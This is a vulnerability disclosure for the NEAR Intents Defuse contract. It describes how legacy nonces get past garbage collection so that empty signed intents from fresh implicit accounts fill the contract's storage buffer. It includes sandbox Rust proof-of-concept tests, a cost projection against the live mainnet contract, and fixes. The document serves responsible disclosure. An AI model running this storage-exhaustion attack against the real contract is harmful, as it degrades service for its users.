# Near Intents: Non-reclaimable old nonce storage can consume the Defuse storage buffer

## Summary

Defuse is the core NEAR Intents verifier/settlement contract. It must keep NEAR locked to pay for every account and nonce record it stores.

Defuse still accepts old nonces in `execute_intents`, and those old nonces can bypass GC cleanup. An attacker can create many fresh implicit accounts, meaning offline-generated NEAR accounts derived from new keypairs, and submit empty signed intents that force Defuse to store permanent junk account/nonce data.

On the current live `intents.near` snapshot, exhausting the visible storage buffer would take roughly 74.8k payloads, about 35.2 NEAR in attacker gas (~$75 at $2.14/NEAR), and about 2.1 hours at 10 payloads/sec. This is not permanent chain DoS or direct fund theft, but new state-writing flows can fail until the team tops up the contract or patches/migrates cleanup for those old nonces.

We reported this bug to NEAR who acknowledged the report as valid. NEAR mitigates this problem as there is an automatic system to refill storage when it approaches the limit.

This bug was found autonomously using V12 by Jisub Kim of the [V12](https://v12.sh) security team.

## Impact

The direct impact is contract-level liveness degradation and forced storage cost.

If the Defuse contract account runs out of free storage buffer, storage-increasing calls can revert. That can affect normal user flows because signed intent execution commits a fresh nonce, new users create account state, and token flows can create balance/account state.

This does not delete the contract and does not halt NEAR. Storage-neutral calls and view calls may still work. Service can be restored by adding NEAR to the contract account, or by patching cleanup/migration logic so the junk old nonce state can be reclaimed.

## Current live snapshot

Public mainnet RPC query on 2026-06-23:

```text
account_id:      intents.near
block_height:    203825453
code_hash:       HUJ89jxFhsXF17XS8L5kmxz7te8AKfdWw2xzrVYo7aoj
amount:          93,752.560973755 NEAR
storage_usage:   9,313,747,472 bytes
```

NEAR storage model used for calculation:

```text
100,000 bytes ~= 1 NEAR locked as storage collateral
```

Derived live headroom:

```text
current storage collateral required: 93,137.474720 NEAR
visible free storage headroom:          615.086254 NEAR
visible free storage headroom in USD:  ~$1,316.28 at $2.14/NEAR
```

Cost/time projection from the strongest PoC path:

| Path | Per-payload Defuse storage growth | Calls to consume current visible headroom | Attacker gas estimate | Time at 1 payload/sec | Time at 5 payloads/sec | Time at 10 payloads/sec |
| --- | ---: | ---: | ---: | ---: | ---: | ---: |
| Fresh implicit account + empty signed intent | 822 bytes / 0.00822 NEAR | ~74,828 | ~35.17 NEAR / ~$75.26 | ~20.79 hours | ~4.16 hours | ~2.08 hours |
| Same account + new old-nonce prefix | 104 bytes / 0.00104 NEAR | ~591,429 | ~277.97 NEAR / ~$594.86 | ~164.29 hours | ~32.86 hours | ~16.43 hours |

The first path is stronger for storage pressure. The second path is the cleaner proof that old nonce entries bypass GC cleanup.

## Root Cause

### 1. `execute_intents` is public and does not charge a storage deposit

The caller pays transaction gas, but the method does not require a storage deposit for newly created Defuse account/nonce state.

```rust
// contracts/defuse/src/contract/intents/mod.rs:25-31
#[near]
impl Intents for Contract {
    #[pause(name = "intents")]
    #[inline]
    fn execute_intents(&mut self, signed: Vec<MultiPayload>) {
        if let Some(event) = Engine::new(self, ExecuteInspector::default())
            .execute_signed_intents(signed)
```

### 2. Fresh implicit accounts are accepted without a pre-existing Defuse account

If no Defuse account record exists, the contract accepts the key when the `account_id` equals the implicit account id derived from the public key.

```rust
// contracts/defuse/src/contract/intents/state.rs:44-50
fn has_public_key(&self, account_id: &AccountIdRef, public_key: &PublicKey) -> bool {
    self.accounts
        .get(account_id)
        .map(Lock::as_inner_unchecked)
        .map_or_else(
            || account_id == public_key.to_implicit_account_id(),
            |account| account.has_public_key(account_id, public_key),
```

This lets an attacker generate many fresh implicit accounts offline, sign empty intents, and submit those signed payloads from any funded transaction caller.

### 3. Old nonces are accepted

`verify_intent_nonce` only validates versioned nonces. If the nonce is old/non-versioned, `maybe_from` returns `None` and the verifier returns `Ok(())`.

```rust
// contracts/defuse/core/src/engine/mod.rs:77-90
// commit nonce
self.verify_intent_nonce(nonce, deadline)?;
self.state.commit_nonce(signer_id.clone(), nonce)?;

#[inline]
fn verify_intent_nonce(&self, nonce: Nonce, intent_deadline: Deadline) -> Result<()> {
    let Some(nonce) = VersionedNonce::maybe_from(nonce) else {
        return Ok(());
    };
```

### 4. GC skips old nonces

The privileged cleanup path explicitly refuses to clean old/non-versioned nonces.

```rust
// contracts/defuse/src/contract/garbage_collector.rs:16-24
for (account_id, nonces) in nonces {
    for nonce in nonces.into_iter().map(AsBase64::into_inner) {
        if !self.is_nonce_cleanable(nonce) {
            continue;
        }

        let [prefix @ .., _] = nonce;
        let _ = State::cleanup_nonce_by_prefix(self, &account_id, prefix);
    }
}

// contracts/defuse/src/contract/garbage_collector.rs:32-35
fn is_nonce_cleanable(&self, nonce: Nonce) -> bool {
    let Some(versioned_nonce) = VersionedNonce::maybe_from(nonce) else {
        return false;
    };
```

There is also a unit/property test showing legacy/old nonce entries cannot be cleared by prefix:

```rust
// contracts/defuse/src/contract/accounts/account/nonces.rs:201-212
fn legacy_nonces_cant_be_cleared(storage_prefix in storage_prefixes(), random_nonce : U256) {
    let legacy_nonces = get_legacy_map(&[random_nonce], storage_prefix.clone());
    let mut new = MaybeLegacyAccountNonces::with_legacy(
        legacy_nonces,
        LookupMap::with_hasher(storage_prefix),
    );

    let [prefix @ .., _] = random_nonce;
    assert!(!new.cleanup_by_prefix(prefix));
    assert!(new.is_used(random_nonce));
}
```

## Reproduction

The PoC below runs in the repository test suite and proves two things:

1. Empty signed intents from fresh implicit accounts create Defuse-paid account/nonce storage.
2. Old nonce entries are skipped by the privileged GC cleanup path and remain marked as used.

### PoC Files

The PoC is already attached in the repository:

| Purpose | File | Test |
| --- | --- | --- |
| Storage growth from empty signed intents | `tests/src/tests/defuse/accounts/storage_growth.rs` | `public_account_management_and_empty_intents_grow_defuse_storage` |
| GC skips old nonces | `tests/src/tests/defuse/accounts/nonces.rs` | `test_cleanup_nonces` |

### PoC 1: Defuse-paid storage growth from empty signed intents

Command:

```bash
cargo test -p defuse-tests --no-default-features --features defuse,escrow-swap storage_growth -- --nocapture --test-threads=1
```

Result on 2026-06-23:

```text
test result: ok. 2 passed; 0 failed
```

Relevant measured deltas:

```text
STORAGE_DELTA empty_signed_intent_fresh_implicit_account:
delta_bytes=822 locked_near=0.00822000

STORAGE_DELTA additional_non_versioned_nonce_same_prefix_same_account:
delta_bytes=0 locked_near=0.00000000

STORAGE_DELTA additional_non_versioned_nonce_new_prefix_same_account:
delta_bytes=104 locked_near=0.00104000
```

Interpretation:

- A fresh implicit account with an empty signed intent creates 822 bytes of Defuse-paid storage.
- Reusing the same old nonce prefix only sets another bit, so it does not grow storage.
- Using a new old-nonce prefix adds 104 bytes for another nonce bitmap word.

What the test does:

1. Deploys a fresh local Defuse sandbox contract.
2. Creates a fresh implicit account. This represents an attacker-generated offline NEAR keypair/account.
3. Signs an empty Defuse intent with an old nonce.
4. Submits that signed payload to `execute_intents` from the sandbox root account.
5. Compares Defuse `storage_usage` before and after the call.
6. Confirms that the nonce is now marked as used.
7. Repeats with the same old nonce prefix and then with a new old nonce prefix.

#### PoC 1 Code

```rust
// tests/src/tests/defuse/accounts/storage_growth.rs

async fn defuse_storage_usage(env: &Env) -> u64 {
    env.defuse
        .view()
        .await
        .expect("failed to view defuse account")
        .storage_usage
}

fn print_storage_delta(label: &str, before: u64, after: u64) {
    const BYTES_PER_NEAR: f64 = 100_000.0;
    let delta = after
        .checked_sub(before)
        .expect("storage usage should not decrease in this PoC");
    eprintln!(
        "STORAGE_DELTA {label}: before={before} after={after} delta_bytes={delta} locked_near={:.8}",
        delta as f64 / BYTES_PER_NEAR
    );
}

#[rstest]
#[trace]
#[tokio::test]
async fn public_account_management_and_empty_intents_grow_defuse_storage() {
    let env = Env::builder().build().await;

    // Create a fresh implicit account. In the real attack model this can be
    // generated offline from a new keypair.
    let implicit_user = env
        .root()
        .fund_implicit(NearToken::from_near(10))
        .await
        .expect("failed to fund implicit account");

    // Old nonce: arbitrary 32 bytes, not a versioned nonce.
    let nonce = [0x42; 32];

    // Empty signed intent. No value-bearing action is included.
    let empty_payload = implicit_user
        .sign_defuse_message(
            env.defuse.id(),
            nonce,
            Deadline::MAX,
            DefuseIntents { intents: [].into() },
        )
        .await;

    let before_empty_intent = defuse_storage_usage(&env).await;
    env.root()
        .execute_intents(env.defuse.id(), [empty_payload])
        .await
        .expect("empty signed intent execution failed");
    let after_empty_intent = defuse_storage_usage(&env).await;

    print_storage_delta(
        "empty_signed_intent_fresh_implicit_account",
        before_empty_intent,
        after_empty_intent,
    );

    assert!(
        after_empty_intent > before_empty_intent,
        "empty signed bundle for a fresh implicit account must commit nonce and grow Defuse storage"
    );
    assert!(
        env.defuse
            .is_nonce_used(implicit_user.id(), &nonce)
            .await
            .expect("nonce view failed")
    );

    // Same 31-byte prefix, different final byte. This only sets another bit
    // inside an existing bitmap word and should not grow storage.
    let mut same_prefix_nonce = [0x42; 32];
    same_prefix_nonce[31] = 0x43;
    let same_prefix_payload = implicit_user
        .sign_defuse_message(
            env.defuse.id(),
            same_prefix_nonce,
            Deadline::MAX,
            DefuseIntents { intents: [].into() },
        )
        .await;

    let before_same_prefix_empty_intent = defuse_storage_usage(&env).await;
    env.root()
        .execute_intents(env.defuse.id(), [same_prefix_payload])
        .await
        .expect("same-prefix empty signed intent execution failed");
    let after_same_prefix_empty_intent = defuse_storage_usage(&env).await;

    print_storage_delta(
        "additional_non_versioned_nonce_same_prefix_same_account",
        before_same_prefix_empty_intent,
        after_same_prefix_empty_intent,
    );

    assert!(
        env.defuse
            .is_nonce_used(implicit_user.id(), &same_prefix_nonce)
            .await
            .expect("same-prefix nonce view failed")
    );

    // New 31-byte prefix. This creates another nonce bitmap word and grows
    // Defuse-paid storage.
    let new_prefix_nonce = [0x43; 32];
    let new_prefix_payload = implicit_user
        .sign_defuse_message(
            env.defuse.id(),
            new_prefix_nonce,
            Deadline::MAX,
            DefuseIntents { intents: [].into() },
        )
        .await;

    let before_new_prefix_empty_intent = defuse_storage_usage(&env).await;
    env.root()
        .execute_intents(env.defuse.id(), [new_prefix_payload])
        .await
        .expect("new-prefix empty signed intent execution failed");
    let after_new_prefix_empty_intent = defuse_storage_usage(&env).await;

    print_storage_delta(
        "additional_non_versioned_nonce_new_prefix_same_account",
        before_new_prefix_empty_intent,
        after_new_prefix_empty_intent,
    );

    assert!(
        after_new_prefix_empty_intent > before_new_prefix_empty_intent,
        "new-prefix nonce should create another bitmap word and grow storage"
    );
    assert!(
        env.defuse
            .is_nonce_used(implicit_user.id(), &new_prefix_nonce)
            .await
            .expect("new-prefix nonce view failed")
    );
}
```

Expected output excerpt:

```text
execute_intents({
  "signed": [
    {
      "standard": "nep413",
      "payload": {
        "message": "{\"signer_id\":\"9f60603ac3d516613696636f8127ad060f4416698cbb57e881f65e374b020cc4\",\"deadline\":\"+262142-12-31T23:59:59.999999999Z\"}",
        "nonce": "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=",
        "recipient": "defuse.1.test"
      },
      "public_key": "ed25519:Bj94SQPS8jQknkFvKXDMAn8hgoCWtZHtzXJpUQCgjpgs",
      "signature": "ed25519:..."
    }
  ]
})

STORAGE_DELTA empty_signed_intent_fresh_implicit_account:
before=1469661 after=1470483 delta_bytes=822 locked_near=0.00822000

STORAGE_DELTA additional_non_versioned_nonce_same_prefix_same_account:
before=1470483 after=1470483 delta_bytes=0 locked_near=0.00000000

STORAGE_DELTA additional_non_versioned_nonce_new_prefix_same_account:
before=1470483 after=1470587 delta_bytes=104 locked_near=0.00104000

test result: ok. 2 passed; 0 failed
```

Why this proves the storage-growth side:

- The signed intent has an empty intent list, so no swap, deposit, withdrawal, or balance movement is needed.
- The signer is a fresh implicit account accepted by Defuse's implicit-key rule.
- The nonce is an old nonce, so `verify_intent_nonce` accepts it without versioned nonce checks.
- `execute_intents` commits the nonce before executing the empty intent list.
- Defuse `storage_usage` increases by 822 bytes for the fresh implicit account path.

### PoC 2: Old nonces bypass GC cleanup

Command:

```bash
cargo test -p defuse-tests --no-default-features --features defuse,escrow-swap test_cleanup_nonces -- --nocapture --test-threads=1
```

Result on 2026-06-23:

```text
test result: ok. 1 passed; 0 failed
```

What the test does:

1. Deploys a fresh local Defuse sandbox contract.
2. Creates three signed empty intents:
   - an old nonce,
   - an expired versioned nonce,
   - a long-lived versioned nonce.
3. Executes all three intents so the nonces are committed.
4. Waits until the short-lived versioned nonce is expired.
5. Confirms a normal user cannot call `cleanup_nonces`.
6. Grants the user `GarbageCollector`.
7. Calls `cleanup_nonces` on the expired versioned nonce and confirms it is removed.
8. Calls `cleanup_nonces` on the old nonce and confirms it remains used.
9. Invalidates the salt for the long-lived versioned nonce and confirms that versioned nonce can then be cleaned.

The important contrast is that cleanable versioned nonces are removable, but old nonces are skipped and remain in state.

#### PoC 2 Code

```rust
// tests/src/tests/defuse/accounts/nonces.rs
let legacy_nonce: Nonce = rng.random();
let expirable_nonce = create_random_salted_nonce(current_salt, deadline, &mut rng);
let long_term_expirable_nonce =
    create_random_salted_nonce(current_salt, long_term_deadline, &mut rng);

// Commit old nonce + versioned nonces.
env.simulate_and_execute_intents(
    env.defuse.id(),
    join_all([
        user.sign_defuse_message(
            env.defuse.id(),
            legacy_nonce,
            deadline,
            DefuseIntents { intents: [].into() },
        ),
        user.sign_defuse_message(
            env.defuse.id(),
            expirable_nonce,
            deadline,
            DefuseIntents { intents: [].into() },
        ),
        user.sign_defuse_message(
            env.defuse.id(),
            long_term_expirable_nonce,
            long_term_deadline,
            DefuseIntents { intents: [].into() },
        ),
    ])
    .await,
)
.await
.unwrap();

// Grant GarbageCollector and clean the expired versioned nonce.
env.acl_grant_role(env.defuse.id(), Role::GarbageCollector, user.id())
    .await
    .expect("failed to grant role");

user.cleanup_nonces(
    env.defuse.id(),
    vec![(user.id().clone(), vec![expirable_nonce])],
)
.await
.unwrap();

assert!(
    !env.defuse
        .is_nonce_used(user.id(), &expirable_nonce)
        .await
        .unwrap(),
);

// Try to clean the old nonce in the same privileged cleanup path.
user.cleanup_nonces(
    env.defuse.id(),
    vec![
        (user.id().clone(), vec![expirable_nonce]),
        (user.id().clone(), vec![legacy_nonce]),
        (user.id().clone(), vec![long_term_expirable_nonce]),
        (unknown_user, vec![expirable_nonce]),
    ],
)
.await
.unwrap();

assert!(
    env.defuse
        .is_nonce_used(user.id(), &legacy_nonce)
        .await
        .unwrap(),
);
```

This shows that the privileged cleanup path removes cleanable versioned nonces, but skips the old nonce and leaves it marked as used.

Expected output excerpt:

```text
FAIL: ... "Insufficient permissions for method cleanup_nonces restricted by access control.
Requires one of these roles: [\"DAO\", \"GarbageCollector\"]"

EVENT_JSON:{"standard":"AccessControllable","version":"1.0.0","event":"role_granted","data":{"role":"GarbageCollector", ...}}

test result: ok. 1 passed; 0 failed
```

Why this proves the cleanup-bypass side:

- The same test proves the GC path works for eligible versioned nonces.
- The old nonce is included in the privileged cleanup request.
- After cleanup returns successfully, `is_nonce_used(user.id(), &legacy_nonce)` is still true.
- Therefore the issue is not missing permissions or a broken test harness; the cleanup logic intentionally skips old nonces.

## Suggested fix

Recommended primary fix:

- Reject old nonces in `verify_intent_nonce`; require all new signed intents to use versioned nonces.

Additional hardening:

- Add a migration or privileged cleanup path for old nonce prefixes already present in state.
- Require storage accounting or a refundable storage deposit for public paths that create account/nonce/balance state.
- Add regression tests for:
  - old nonce rejection,
  - old nonce cleanup/migration,
  - storage-neutral behavior of empty signed intents after the fix.
